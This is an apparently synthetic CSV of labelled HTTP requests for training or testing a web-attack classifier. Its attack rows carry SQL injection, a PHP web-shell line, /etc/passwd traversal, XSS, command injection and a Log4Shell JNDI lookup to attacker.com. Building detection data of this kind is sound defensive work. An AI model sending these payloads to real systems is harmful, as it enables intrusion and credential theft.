id,timestamp,method,path,http_headers,body,label
f2596f3a-bdda-42aa-b2b8-cd2de6e384ed,2026-02-24 23:44:16,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
22c2f26c-c536-40f3-8583-2cf249301d78,2026-02-24 08:36:29,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
c84de52d-e8fe-4d31-b8ec-235336186964,2026-02-24 20:17:29,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
f278d0e6-a6f2-4664-8e5a-a45f5d3e5162,2026-02-24 21:44:00,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
02b26768-3055-47f6-a948-5d4e70c36500,2026-02-24 22:11:00,POST,/checkout,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
15e1945f-1980-4fa6-9a4e-763be5aebe43,2026-02-25 04:28:37,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
8797517d-8d16-43e3-bed1-51bf0bc8695e,2026-02-24 17:17:07,GET,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Nikto/2.1.6,<?php system($_GET['cmd']); ?>,attack
b7cac5e7-0212-4862-96cf-788406da24d6,2026-02-25 09:32:49,GET,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
5a2ba8e1-dab8-4497-aaa2-089d62ec4f62,2026-02-24 15:02:45,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
438ff867-8a08-48eb-9f17-94c45379da1b,2026-02-24 17:14:00,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
42073a96-1b05-49d3-a33f-d4bc92fa4229,2026-02-25 05:59:07,POST,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
9102e5ad-b91a-4261-bace-dddaa60b4fd3,2026-02-24 15:26:07,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
161d92a8-edcb-40ef-8408-6a0433313585,2026-02-24 12:59:22,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: python-requests/2.25.1,/admin?user=admin'--,attack
5cd69fdc-94ec-4139-b7f3-88561d5988e0,2026-02-24 21:14:19,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
5195d9db-2343-4e5a-87be-202eacb1c559,2026-02-24 20:10:01,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
d9f0b36f-81bb-4929-b2c8-2c607c15172e,2026-02-25 02:17:32,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
717385c7-0a77-4255-a1b8-c0029c3b4bb1,2026-02-24 22:20:49,GET,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
9c6ea046-ef49-43f6-8771-42e7f71d5d31,2026-02-24 20:57:58,GET,/products,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
b3d67e1b-101d-45d6-bfaa-7e282815cf94,2026-02-25 07:03:22,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
cc5f915b-f617-4118-8b49-a525d6dbbf42,2026-02-25 02:31:59,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
632d705a-e141-43c5-8f4e-255a666097c9,2026-02-24 21:49:41,GET,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
9f6df0ff-7ada-4bf6-9feb-3347b8807658,2026-02-24 07:44:14,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),"UNION SELECT username, password FROM users --",attack
a8e15708-4547-42ad-8897-2c08550c81d3,2026-02-24 12:29:51,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),|| ping -c 4 127.0.0.1 ||,attack
58546a95-10e4-4c87-92f0-85e9fd1e2dbd,2026-02-25 03:12:09,POST,/api/v1/orders?status=completed,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
e5d0e748-07af-4242-8d9e-5e01bb9ef901,2026-02-24 06:36:35,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<img src=x onerror=alert(1)>,attack
1c5eee2d-fae1-47e4-b4f3-39a0e70bbe18,2026-02-24 12:01:49,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
25dc9acc-69e4-4c6e-928f-7a5010ad268e,2026-02-24 09:29:25,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
9bf2c2c1-1b5d-4143-8dae-ba9c8dd55e04,2026-02-24 06:41:55,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
d73bb91b-d869-4da8-906b-72e12ac0cf78,2026-02-25 06:49:06,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
b4481590-3d63-44b0-850f-a4cba925e7a9,2026-02-24 23:46:28,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
101e43e2-8c0a-42de-9e95-9701ff9a49ad,2026-02-24 22:17:14,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
a00cd6d5-0ee5-4558-85d5-6bce6af7c47d,2026-02-25 07:58:40,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
43d4211e-0c6b-48f9-b712-e53a58575ef4,2026-02-24 06:58:58,POST,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
5a2e466f-5eb5-4edb-95a7-5fed436e329a,2026-02-24 10:57:53,GET,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
47a0eada-69cf-4ac8-8936-5dfda4ca53f8,2026-02-24 16:33:55,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: curl/7.68.0,SELECT * FROM users WHERE id = 1 OR 1=1,attack
168d2ce4-a736-4d59-8150-34bc9bfa4178,2026-02-24 13:31:47,POST,/api/v1/orders?status=completed,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
9d8786f1-fe0c-4512-a6d9-f0e17639a7d8,2026-02-24 23:33:45,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
76346875-43e0-400a-bed0-baa8e2c12b08,2026-02-25 01:06:36,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: Nikto/2.1.6,<img src=x onerror=alert(1)>,attack
12b2c593-03b9-4802-8d94-a294062ed018,2026-02-25 03:23:55,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: python-requests/2.25.1,"UNION SELECT username, password FROM users --",attack
188fbe4e-39dc-44dd-8ff7-d7b3c5608578,2026-02-25 04:25:06,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: python-requests/2.25.1,../../etc/passwd,attack
2a7c2411-1537-4ee7-b85d-4488d2a693a2,2026-02-24 07:47:23,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
59190c8f-ba8a-40c4-b72b-fab3e6383e1f,2026-02-24 19:52:16,GET,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: Nikto/2.1.6,|| ping -c 4 127.0.0.1 ||,attack
2be08579-afd3-4465-8f8e-1970dca63211,2026-02-24 21:20:56,POST,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<?php system($_GET['cmd']); ?>,attack
2b7d4528-1015-4348-8f86-17ba07defbdb,2026-02-25 00:06:10,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
39b7cfd4-08b2-4163-a9eb-7218472a8d2d,2026-02-24 23:08:20,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
e92fe49e-af50-4690-94ca-7ab0a2ff21a6,2026-02-24 17:26:08,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
92241923-6e26-4001-ab52-3e832855b1e2,2026-02-25 06:05:28,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Nikto/2.1.6,${jndi:ldap://attacker.com/a},attack
c60f9d4d-a826-469c-a046-8a208a761292,2026-02-25 09:58:22,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),' OR 1=1 --,attack
6a3cde48-e995-4939-985a-5b4adcc81183,2026-02-24 15:48:31,GET,/cart,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
73bfa00c-6b0b-4070-a6b2-45d8ec2292b4,2026-02-25 04:04:15,GET,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
44dc97eb-905b-4e5c-a544-95500cf2539b,2026-02-25 06:31:01,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
54f08e40-0b95-419f-8371-79b263e13781,2026-02-24 07:47:05,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),../../etc/passwd,attack
1a54c65a-39ef-4e8c-bff0-4ed8ccf0174e,2026-02-25 08:17:15,GET,/blog/article-1,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
3bf217ca-ca84-4950-8c61-ecd0ac0dcc21,2026-02-24 09:15:43,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
c8a11ed1-9f6b-4845-b447-243122399d91,2026-02-24 19:57:39,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
14c43f1d-03c3-4b6b-8d6f-db37e26725d7,2026-02-24 23:07:56,POST,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
efaed1fa-234b-4b1c-be69-a0e51395bd6b,2026-02-25 07:28:15,PUT,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
427de372-450a-40b4-ab4d-86c32695d1c8,2026-02-25 00:34:08,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
afd1dedf-6d18-444e-be8a-5233341c5ce5,2026-02-25 07:45:52,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
a7be9503-9430-4d56-b51f-0acda9069ed4,2026-02-24 22:34:13,POST,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
b84aaf9c-7bf7-4ef1-a67b-971856bc6a9d,2026-02-24 11:02:11,DELETE,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: sqlmap/1.6,<?php system($_GET['cmd']); ?>,attack
6befc8cd-c965-4f0f-a41d-877049adec40,2026-02-25 04:03:57,PUT,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: Nikto/2.1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
930ecb01-0e93-416f-90d2-6a20b538b247,2026-02-25 09:49:14,POST,/contact,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
3aee11f0-56c8-40ee-a64e-3930c877c646,2026-02-24 22:20:07,GET,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
b7180c87-c18b-4d31-bc42-3f31d1ed3478,2026-02-25 06:04:29,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: sqlmap/1.6,' OR 1=1 --,attack
44735d58-53f4-4eb3-928a-63e2dbc06019,2026-02-25 05:58:43,DELETE,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
6dc99a07-b25f-436c-b07e-0c9de7a6bfa0,2026-02-24 08:54:53,GET,/contact,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
80c1c76c-9f24-412f-9bef-092efedb8861,2026-02-24 08:49:03,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
efadbaef-a1f9-4def-a8c0-cabbcfcc9854,2026-02-25 04:20:28,PUT,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),<script>alert('XSS')</script>,attack
c52941f2-9aef-40e7-8805-1ea48f8000f8,2026-02-24 09:55:53,POST,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: sqlmap/1.6,<img src=x onerror=alert(1)>,attack
f4adf64f-2042-46c2-92f3-4d7f708d342e,2026-02-24 14:53:51,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
1c4e61cb-864b-488c-b258-763114bcba2d,2026-02-25 09:18:04,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
b2f10b4d-6e98-4c32-a42b-9f4242da608c,2026-02-24 20:03:20,GET,/contact,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
ca41ee20-2472-471c-ba10-09da7b46e294,2026-02-25 08:55:33,GET,/products?id=123,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
0653ba10-eb02-483a-b771-dbd27b1834c3,2026-02-25 09:04:55,GET,/vulnerable_endpoint?id=<script>alert('XSS')</script>,User-Agent: sqlmap/1.6,<script>alert('XSS')</script>,attack
829f1808-0bea-4204-8119-a997a69519e0,2026-02-24 08:29:45,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
3c0d481e-4916-4caf-a7e2-c8b1c3d5f4c5,2026-02-24 12:11:35,GET,/home,User-Agent: Chrome/120.0.0.0,,normal
e0e11d9d-e1a2-4377-afbc-6a8c5171d6f7,2026-02-25 03:20:58,POST,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
beb7ddd8-30d5-48e5-bcbc-f4bd6909baee,2026-02-24 18:42:32,DELETE,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
edb98905-a979-4aa2-85b3-e67a03814c49,2026-02-24 22:25:25,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
03b666a6-1679-4c4e-8543-5d0e6eabef7d,2026-02-24 07:17:12,GET,/products?id=123,User-Agent: Chrome/120.0.0.0,,normal
0d7c2b45-1c98-4a84-8282-d2eba5bc8e90,2026-02-25 02:17:01,GET,/api/v1/users,User-Agent: Chrome/120.0.0.0,,normal
5ae2d91e-9de9-42b1-928b-6643c851725d,2026-02-25 01:01:45,POST,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
cb3d04a6-3960-411c-802a-cae216796ad0,2026-02-24 16:12:03,POST,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
ee450303-41d4-4947-a973-840972941062,2026-02-24 11:26:03,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: sqlmap/1.6,"UNION SELECT username, password FROM users --",attack
f2cd7e8e-2ed7-407c-a07c-59f1b6a98cce,2026-02-24 21:56:46,GET,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
ac4ab99e-0043-4f76-a3e5-a53856e8cf39,2026-02-24 19:38:11,PUT,/vulnerable_endpoint?id=<?php system($_GET['cmd']); ?>,User-Agent: curl/7.68.0,<?php system($_GET['cmd']); ?>,attack
f9904734-0ebd-45e7-b4cd-88e6e58f4cc6,2026-02-24 15:37:08,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
d57df3d1-d2f2-4303-92c6-477b52654625,2026-02-24 23:01:15,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
e2c69da7-c273-454d-99d5-5b278d629533,2026-02-24 09:17:00,GET,/contact,User-Agent: Chrome/120.0.0.0,,normal
2e15a456-da8d-4f43-8bf3-20757abd8a30,2026-02-25 06:05:18,GET,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
6ea082ba-b540-4cdd-b5c3-20d1b66a834e,2026-02-24 19:37:36,GET,/home,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),,normal
97055b18-8f53-4020-bc14-f191eb434d63,2026-02-25 01:14:47,POST,/products,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
bb8d5df1-3a48-4165-b41d-8daea0a64d2a,2026-02-25 07:32:11,POST,/contact,User-Agent: Safari/537.36,field1=value1&field2=value2,normal
43896c9e-becd-4683-b00c-43ec1be7fa2b,2026-02-25 00:58:51,POST,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: curl/7.68.0,/admin?user=admin'--,attack
d5772b30-7929-4db8-9a33-061c12247715,2026-02-25 04:27:28,POST,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
3fadebab-1be1-40a9-a902-039abedf2a49,2026-02-24 23:42:20,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
6410f954-0ae5-4332-a3a3-57456953bf9a,2026-02-24 21:52:29,POST,/products,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
badd2094-eb38-41c4-ae66-53ee3a4246d1,2026-02-24 11:44:55,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
43aa75d1-0c63-4ebe-8d8c-e4d26a34e775,2026-02-25 07:11:01,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
5c6c22e6-f3b2-4180-8649-653294aa4c91,2026-02-24 09:09:12,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
ef867ff1-7a3f-444e-955f-4f633b5300c8,2026-02-24 19:42:20,DELETE,/vulnerable_endpoint?id=SELECT * FROM users WHERE id = 1 OR 1=1,User-Agent: sqlmap/1.6,SELECT * FROM users WHERE id = 1 OR 1=1,attack
a93f0411-c942-4211-8748-45c20d6de542,2026-02-25 02:55:35,GET,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
edfbed8f-cd92-49b8-8a64-3350a46e684a,2026-02-24 14:40:29,GET,/api/v1/users,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),,normal
4981276d-0b46-47e0-a6fa-62cc39435c52,2026-02-25 04:01:18,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
87870a61-8aba-4214-b254-aa457c14ed84,2026-02-24 12:03:21,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: python-requests/2.25.1,${jndi:ldap://attacker.com/a},attack
44bfa091-f2d6-4d77-a2e5-6a5d63d98465,2026-02-24 15:29:49,DELETE,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),/admin?user=admin'--,attack
6fdca584-972d-4865-9d98-38144e773d2d,2026-02-24 12:42:16,DELETE,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
549402c2-168e-49fd-b651-7d45d4e0b346,2026-02-24 07:18:13,GET,/products,User-Agent: Chrome/120.0.0.0,,normal
134d70d9-b1e9-43b8-9611-c13bda980deb,2026-02-24 09:41:00,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
07092fa5-168f-4fd1-b355-9f8762f9f877,2026-02-25 09:18:35,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: python-requests/2.25.1,|| ping -c 4 127.0.0.1 ||,attack
a1d8155c-b509-4325-beee-53594959ba15,2026-02-24 11:23:12,GET,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
4958ab5e-0a6e-4c5c-bda7-c19e4b539224,2026-02-25 02:24:16,POST,/home,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
7881feb0-961e-4eef-8adc-99be04fcd3a8,2026-02-24 21:10:54,GET,/products?id=123,User-Agent: Mozilla/5.0 (X11; Linux x86_64),,normal
b2659af5-c062-487e-9191-821123d1cac4,2026-02-25 01:44:30,POST,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
51bdfabb-4b5f-4ef1-aec0-68118153cca9,2026-02-24 22:15:58,POST,/search?q=shoes,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
67ff71cc-7948-4894-b948-335a6fa5a979,2026-02-24 16:28:43,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: sqlmap/1.6,../../etc/passwd,attack
8baef930-8c84-4245-b44d-75f6183e13ec,2026-02-24 14:45:05,DELETE,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: curl/7.68.0,"UNION SELECT username, password FROM users --",attack
ac1a9550-bfba-459d-bd21-d6e8860f0c5d,2026-02-25 02:10:58,POST,/vulnerable_endpoint?id=../../etc/passwd,User-Agent: Nikto/2.1.6,../../etc/passwd,attack
77e58e07-f0fc-4e87-9abf-2e6330cfb2f1,2026-02-25 05:59:24,POST,/home,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
e0a74662-76b0-41f7-8a74-2ab8b26d26a4,2026-02-25 08:23:06,POST,/home,User-Agent: Chrome/120.0.0.0,field1=value1&field2=value2,normal
c6af35a1-45f1-4ca9-98f7-d8c30a674400,2026-02-24 17:51:36,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: curl/7.68.0,' OR 1=1 --,attack
981d6f26-5a88-4dd8-a988-d138c932323b,2026-02-24 15:41:17,PUT,/vulnerable_endpoint?id=<img src=x onerror=alert(1)>,User-Agent: python-requests/2.25.1,<img src=x onerror=alert(1)>,attack
54707810-3ba7-483b-ac15-3c8381238f38,2026-02-25 01:32:18,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: sqlmap/1.6,/admin?user=admin'--,attack
dbcab188-a54e-4f66-9d35-bfb759e60adb,2026-02-24 15:53:38,POST,/checkout,User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64),field1=value1&field2=value2,normal
02efd76c-5355-4c1b-91ff-1d30227a7c4e,2026-02-25 07:32:35,GET,/search?q=shoes,User-Agent: Safari/537.36,,normal
2d5ff7e9-5ddc-4c16-b388-563d254d6807,2026-02-24 16:06:03,GET,"/vulnerable_endpoint?id=UNION SELECT username, password FROM users --",User-Agent: Nikto/2.1.6,"UNION SELECT username, password FROM users --",attack
75655586-2d90-4ccf-a357-0c6b2e011871,2026-02-24 09:02:31,GET,/products?id=123,User-Agent: Safari/537.36,,normal
257a822d-00fa-49ec-a09d-719b97971a12,2026-02-24 22:32:13,POST,/blog/article-1,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
2e1f43e5-56a4-4d79-aec4-fcd3b41618c2,2026-02-25 07:04:11,PUT,/vulnerable_endpoint?id=/admin?user=admin'--,User-Agent: Nikto/2.1.6,/admin?user=admin'--,attack
dd703689-d238-4088-99ad-77858a2f22ec,2026-02-24 15:56:44,DELETE,/vulnerable_endpoint?id=${jndi:ldap://attacker.com/a},User-Agent: Mozilla/5.0 (compatible; Nmap Scripting Engine),${jndi:ldap://attacker.com/a},attack
904b716f-14be-4c35-acd4-f7fb3c882d26,2026-02-25 00:55:41,GET,/search?q=shoes,User-Agent: Chrome/120.0.0.0,,normal
43d87262-96e9-42ee-a940-c41dab257f3c,2026-02-24 08:15:13,POST,/api/v1/users,User-Agent: Mozilla/5.0 (X11; Linux x86_64),field1=value1&field2=value2,normal
26a69d12-c822-4d55-aa23-dadbd47ec9d1,2026-02-25 06:37:59,POST,/search?q=shoes,User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7),field1=value1&field2=value2,normal
1fee29f1-aa0b-4095-b81a-c345b6cf9272,2026-02-24 21:13:38,POST,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: curl/7.68.0,|| ping -c 4 127.0.0.1 ||,attack
9160f1d3-466d-400d-bdf2-37d04748a745,2026-02-24 14:41:02,DELETE,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
fc77aae9-c1d1-4501-8fee-d51bfd00a1b0,2026-02-25 08:37:51,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: Nikto/2.1.6,' OR 1=1 --,attack
70c10eb8-4d4c-431a-bf05-856c5ebef9dd,2026-02-25 10:16:49,PUT,/vulnerable_endpoint?id=|| ping -c 4 127.0.0.1 ||,User-Agent: sqlmap/1.6,|| ping -c 4 127.0.0.1 ||,attack
da415bb7-69e4-4766-9956-28b573f9d094,2026-02-25 05:01:31,POST,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
9eafc29d-64ab-46a9-937c-1915304c8cae,2026-02-25 06:03:49,PUT,/vulnerable_endpoint?id=' OR 1=1 --,User-Agent: python-requests/2.25.1,' OR 1=1 --,attack
008fb880-e8bf-45ee-9a12-1dbd609bd87b,2026-02-24 18:40:12,GET,/home,User-Agent: Safari/537.36,,normal
